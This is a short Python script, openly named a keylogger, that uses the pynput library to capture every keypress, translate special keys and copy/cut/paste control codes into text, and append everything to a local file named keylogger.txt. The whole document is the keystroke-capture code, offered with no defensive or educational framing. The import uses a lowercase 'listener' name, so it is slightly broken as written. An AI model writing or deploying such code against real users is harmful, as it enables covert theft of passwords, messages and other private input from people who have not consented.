from pynput.keyboard import listener
def keylogger(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.up':
        key = ''
    if key == 'Key.right':
        key = ' '
    if key == 'Key.left':
        key = ''
    if key == 'Key.down':
        key = '\n'
    if key == 'Key.ctrl_l':
        key = 'ctrl '
    if key == '\\x03':
        key = 'copy '
    if key == 'Key.backspace':
        key = ''
    if key == '\\x18':
        key = 'cut '
    if key == '\\x16':
        key = 'paste '
    if not key.isalpha() or key.isnumeric():
        key =' {0} '.format(key)
    with open('keylogger.txt', 'a') as file:
        file.write(key)

with listener(on_press=keylogger) as listen:
    listen.join()